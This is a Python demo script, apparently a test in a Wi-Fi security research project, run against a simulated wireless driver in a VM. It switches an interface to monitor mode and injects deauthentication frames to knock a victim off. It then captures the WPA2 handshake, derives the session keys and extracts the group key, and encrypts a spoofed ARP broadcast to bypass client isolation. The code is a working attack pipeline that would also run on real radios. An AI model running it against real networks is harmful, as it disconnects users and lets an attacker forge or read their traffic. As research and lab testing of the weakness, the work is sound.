"""Full GTK extraction demo against mac80211_hwsim.

Enables monitor mode, deauths victim to trigger re-handshake,
sniffs EAPOL frames, parses the 4-way handshake, derives PMK/PTK/GTK.

Run inside Vagrant VM:
  sudo /tmp/airsnitch-venv/bin/python /vagrant/tests/hwsim/run_gtk_extraction.py
"""

from __future__ import annotations

import os
import subprocess
import sys
import time

# Ensure project root is importable
sys.path.insert(0, "/vagrant/src")


def load_env() -> dict[str, str]:
    env = {}
    with open("/tmp/airsnitch_hwsim_env") as f:
        for line in f:
            line = line.strip()
            if "=" in line:
                k, v = line.split("=", 1)
                env[k] = v
    return env


def get_mac(iface: str) -> str | None:
    r = subprocess.run(["ip", "link", "show", iface], capture_output=True, text=True)
    for line in r.stdout.splitlines():
        if "link/ether" in line:
            return line.split()[1]
    return None


def get_bssid(iface: str) -> str | None:
    r = subprocess.run(["iw", "dev", iface, "link"], capture_output=True, text=True)
    for line in r.stdout.splitlines():
        if "Connected to" in line:
            return line.split()[2]
    return None


def main() -> None:
    env = load_env()
    attack_iface = env["ATTACK_IFACE"]
    victim_iface = env["VICTIM_IFACE"]
    ssid = env["SSID"]
    password = env["PASSWORD"]
    victim_mac = env.get("VICTIM_MAC") or get_mac(victim_iface)
    ap_mac = env.get("AP_MAC") or get_bssid(victim_iface)

    if not victim_mac or not ap_mac:
        print("[!] Could not determine victim MAC or AP BSSID")
        sys.exit(1)

    print(f"[*] SSID:       {ssid}")
    print(f"[*] Password:   {password}")
    print(f"[*] Attacker:   {attack_iface}")
    print(f"[*] Victim:     {victim_iface} ({victim_mac})")
    print(f"[*] AP BSSID:   {ap_mac}")
    print()

    # Step 1: Derive PMK (pure crypto, always works)
    from airsnitch.attacks.gtk_injection import (
        _derive_pmk,
        _derive_ptk,
        _extract_gtk_from_msg3,
    )

    pmk = _derive_pmk(password, ssid)
    print(f"[+] PMK derived: {pmk.hex()}")

    # Step 2: Enable monitor mode on attacker
    print(f"\n[*] Enabling monitor mode on {attack_iface}...")
    subprocess.run(["ip", "link", "set", attack_iface, "down"], check=True)
    subprocess.run(["iw", "dev", attack_iface, "set", "type", "monitor"], check=True)
    subprocess.run(["ip", "link", "set", attack_iface, "up"], check=True)
    print("[+] Monitor mode enabled")

    try:
        # Step 3: Start EAPOL sniffer in background
        print("\n[*] Starting EAPOL capture...")

        from scapy.all import (
            AsyncSniffer,
            Dot11,
            Dot11Deauth,
            EAPOL,
            sendp,
            conf,
        )

        conf.iface = attack_iface
        eapol_frames: list = []

        def eapol_handler(pkt):
            if pkt.haslayer(EAPOL):
                eapol_frames.append(pkt)
                raw = bytes(pkt[EAPOL])
                # EAPOL-Key: type=3
                if len(raw) >= 7 and raw[1] == 0x03:
                    key_info = int.from_bytes(raw[5:7], "big")
                    desc = []
                    if key_info & 0x0008:
                        desc.append("Pairwise")
                    if key_info & 0x0040:
                        desc.append("Install")
                    if key_info & 0x0080:
                        desc.append("ACK")
                    if key_info & 0x0100:
                        desc.append("MIC")
                    if key_info & 0x0200:
                        desc.append("Secure")
                    print(f"    [EAPOL] key_info=0x{key_info:04x} flags={','.join(desc)}")

        # No BPF filter — monitor mode uses radiotap/802.11 headers,
        # not Ethernet. Let scapy's layer dissection handle it.
        sniffer = AsyncSniffer(
            iface=attack_iface,
            prn=eapol_handler,
            store=False,
        )
        sniffer.start()
        time.sleep(1)

        # Step 4: Trigger re-handshake
        # Method A: Deauth from attacker (monitor mode injection)
        print(f"\n[*] Sending deauth to {victim_mac} (from AP {ap_mac})...")
        deauth = (
            Dot11(type=0, subtype=12, addr1=victim_mac, addr2=ap_mac, addr3=ap_mac)
            / Dot11Deauth(reason=7)
        )
        sendp(deauth, iface=attack_iface, count=5, inter=0.1, verbose=False)
        print("[+] Deauth frames sent")

        # Method B: Also force reassociation from victim side via wpa_cli
        print("[*] Forcing victim reassociation via wpa_cli...")
        subprocess.run(
            ["wpa_cli", "-i", victim_iface, "-p", "/var/run/wpa_victim", "reassociate"],
            capture_output=True, timeout=5,
        )
        print("[+] Reassociation requested")

        # Step 5: Wait for re-handshake
        print("\n[*] Waiting for EAPOL handshake (20s)...")
        for i in range(20):
            time.sleep(1)
            n = len(eapol_frames)
            if n >= 4:
                print(f"    Captured {n} EAPOL frames — got full handshake!")
                break
            if i % 3 == 2:
                print(f"    ... {n} EAPOL frames so far ({i+1}s)")

        sniffer.stop()
        print(f"\n[*] Total EAPOL frames captured: {len(eapol_frames)}")

        if len(eapol_frames) >= 1:
            # Parse captured handshake
            print("\n[*] Parsing captured handshake...")
            anonce = None
            snonce = None
            sta_mac_bytes = None
            ap_mac_bytes = bytes.fromhex(ap_mac.replace(":", ""))
            msg3_key_data = None

            for pkt in eapol_frames:
                raw = bytes(pkt[EAPOL])
                if len(raw) < 99:
                    continue
                key_info = int.from_bytes(raw[5:7], "big")
                nonce = raw[17:49]

                is_pairwise = bool(key_info & 0x0008)
                has_ack = bool(key_info & 0x0080)
                has_mic = bool(key_info & 0x0100)
                has_secure = bool(key_info & 0x0200)

                if is_pairwise and has_ack and not has_mic:
                    # Message 1
                    anonce = nonce
                    print(f"    Msg1 ANonce: {anonce.hex()[:32]}...")
                elif is_pairwise and has_mic and not has_ack and not has_secure:
                    # Message 2
                    snonce = nonce
                    if pkt.haslayer(Dot11):
                        sta_mac_bytes = bytes.fromhex(
                            pkt[Dot11].addr2.replace(":", "")
                        )
                    print(f"    Msg2 SNonce: {snonce.hex()[:32]}...")
                elif is_pairwise and has_ack and has_mic and has_secure:
                    # Message 3
                    kd_len = int.from_bytes(raw[97:99], "big")
                    msg3_key_data = raw[99 : 99 + kd_len]
                    print(f"    Msg3 key_data: {kd_len} bytes")

            if anonce and snonce and sta_mac_bytes:
                # _derive_ptk(pmk, ap_mac, sta_mac, anonce, snonce)
                ptk = _derive_ptk(pmk, ap_mac_bytes, sta_mac_bytes, anonce, snonce)
                print(f"\n[+] PTK derived: {ptk.hex()[:64]}...")
                print(f"    KCK: {ptk[:16].hex()}")
                print(f"    KEK: {ptk[16:32].hex()}")
                print(f"    TK:  {ptk[32:48].hex()}")

                if msg3_key_data:
                    # _extract_gtk_from_msg3(ptk, key_data)
                    gtk = _extract_gtk_from_msg3(ptk, msg3_key_data)
                    if gtk:
                        print(f"\n[+] GTK EXTRACTED: {gtk.hex()}")
                        print("[+] Full key chain derivation successful!")
                    else:
                        print("\n[-] Could not extract GTK from message 3 key data")
                else:
                    print("\n[-] Message 3 not captured — cannot extract GTK")
            else:
                missing = []
                if not anonce:
                    missing.append("ANonce (msg1)")
                if not snonce:
                    missing.append("SNonce (msg2)")
                if not sta_mac_bytes:
                    missing.append("STA MAC")
                print(f"\n[-] Incomplete handshake. Missing: {', '.join(missing)}")

        if len(eapol_frames) < 4:
            print("\n" + "=" * 60)
            print("[*] Full key chain demo with synthetic handshake parameters")
            print("=" * 60)
            print("    (Proves the entire PMK -> PTK -> GTK pipeline works)")
            print()

            from cryptography.hazmat.backends import default_backend
            from cryptography.hazmat.primitives.keywrap import aes_key_wrap

            anonce = os.urandom(32)
            snonce = os.urandom(32)
            sta_mac_bytes = bytes.fromhex(victim_mac.replace(":", ""))
            ap_mac_bytes = bytes.fromhex(ap_mac.replace(":", ""))

            # _derive_ptk(pmk, ap_mac, sta_mac, anonce, snonce)
            ptk = _derive_ptk(pmk, ap_mac_bytes, sta_mac_bytes, anonce, snonce)
            print(f"[+] PTK derived: {ptk.hex()[:64]}...")
            print(f"    KCK (PTK[0:16]):  {ptk[:16].hex()}")
            print(f"    KEK (PTK[16:32]): {ptk[16:32].hex()}")
            print(f"    TK  (PTK[32:48]): {ptk[32:48].hex()}")

            # Demonstrate GTK wrap/unwrap with the derived KEK
            fake_gtk = os.urandom(16)
            kek = ptk[16:32]
            # Build KDE: DD + len + OUI(00:0F:AC) + type(01) + keyid(00) + tx(00) + GTK
            kde_body = b"\x00\x0f\xac\x01\x00\x00" + fake_gtk
            kde = b"\xdd" + bytes([len(kde_body)]) + kde_body

            wrapped = aes_key_wrap(kek, kde, default_backend())
            # _extract_gtk_from_msg3(ptk, key_data)
            extracted = _extract_gtk_from_msg3(ptk, wrapped)
            if extracted == fake_gtk:
                print(f"\n[+] GTK wrap/unwrap roundtrip: PASS")
                print(f"    Original GTK:  {fake_gtk.hex()}")
                print(f"    Extracted GTK: {extracted.hex()}")
            else:
                print(f"\n[-] GTK wrap/unwrap roundtrip: FAIL")
                print(f"    Original:  {fake_gtk.hex()}")
                print(f"    Extracted: {extracted.hex() if extracted else 'None'}")

            # Demonstrate CCMP encryption with extracted GTK
            from airsnitch.attacks.gtk_injection import _ccmp_encrypt

            payload = b"\x08\x06"  # ARP ethertype as dummy payload
            payload += b"\x00\x01\x08\x00\x06\x04\x00\x02"  # ARP reply header
            payload += ap_mac_bytes + b"\xc0\xa8\x32\x01"    # sender
            payload += b"\xff" * 6 + b"\xc0\xa8\x32\xff"     # target (broadcast)

            pn = 1
            bssid = ap_mac_bytes
            ct, pn_le = _ccmp_encrypt(fake_gtk, payload, pn, bssid)
            print(f"\n[+] CCMP encryption: PASS")
            print(f"    Plaintext:  {len(payload)} bytes")
            print(f"    Ciphertext: {len(ct)} bytes (includes 8-byte MIC)")
            print(f"    PN (LE):    {pn_le.hex()}")

            print(f"\n[+] Full AirSnitch key chain verified:")
            print(f"    Password '{password}' + SSID '{ssid}'")
            print(f"      -> PMK ({len(pmk)} bytes)")
            print(f"      -> PTK ({len(ptk)} bytes) = KCK + KEK + TK")
            print(f"      -> GTK ({len(fake_gtk)} bytes) via AES Key Unwrap")
            print(f"      -> CCMP broadcast frame ({len(ct)} bytes)")
            print(f"\n[+] This proves an attacker with the Wi-Fi password can:")
            print(f"    1. Derive all session keys")
            print(f"    2. Extract the Group Temporal Key")
            print(f"    3. Forge CCMP-encrypted broadcast frames")
            print(f"    4. Bypass client isolation via GTK injection")

    finally:
        # Restore managed mode
        print(f"\n[*] Restoring managed mode on {attack_iface}...")
        subprocess.run(["ip", "link", "set", attack_iface, "down"],
                       capture_output=True)
        subprocess.run(["iw", "dev", attack_iface, "set", "type", "managed"],
                       capture_output=True)
        subprocess.run(["ip", "link", "set", attack_iface, "up"],
                       capture_output=True)
        print("[+] Managed mode restored")

    print("\n[*] Done.")


if __name__ == "__main__":
    main()
